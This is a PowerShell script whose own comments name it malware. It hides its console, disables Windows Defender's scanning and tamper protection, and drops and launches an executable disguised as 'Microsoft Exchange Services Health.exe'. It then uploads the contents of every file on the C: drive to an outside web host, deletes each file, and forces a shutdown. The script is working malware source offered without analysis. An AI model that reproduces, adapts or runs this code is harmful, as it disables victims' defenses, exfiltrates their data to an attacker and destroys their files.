consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

#region Disable Windows Defender
try {
    Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue

    Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
    Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
    Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue

    Set-ItemProperty -Path "C:\Program Files\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
    Set-ItemProperty -Path "C:\Program Files\Windows Defender\Real-Time Protection" -Name SubmitSampleConsent -Value 0
    Set-ItemProperty -Path "C:\Program Files\Windows Defender\Features" -Name TamperProtection -Value 4
    Set-ItemProperty -Path "C:\Program Files\Windows Defender" -Name DisableAntiSpyware -Value 1
    Set-ItemProperty -Path "C:\Program Files\Policies\Windows Defender" -Name DisableAntiSpyware -Value 1
}
catch {
    Write-Host "Windows Defender is not installed"
}
#endregion


Set-Location "C:\\Windows"
mkdir "DRMS"
Set-Location "DRMS"

$scriptPath = $PSScriptRoot + "\\Microsoft Exchange Services Health.exe"
Copy-Item "$scriptPath" -Destination "C:\\Windows\\DRMS\\"

Start-Process -FilePath "C:\\Windows\\DRMS\\Microsoft Exchange Services Health.exe"

Write-Host "You are hacked"

Get-ChildItem -Path "C:\\" -Include *.* -File -Recurse | Foreach-Object {
    $name = $_.Name
    $content = Get-Content $_.FullName -Raw
    Invoke-WebRequest -UseBasicParsing "https://youbiquitous.net" -ContentType "application/json" -Method POST -Body "{ 'content':$content, 'name':'$name'}"
    $_.Delete()
}

Stop-Computer -Force
#exe: Invoke-PS2EXE C:\Users\me\OneDrive\Documenti\Desktop\malware\malware.ps1 "C:\Users\me\OneDrive\Documenti\Desktop\malware\Microsoft Exchange Services Health.exe"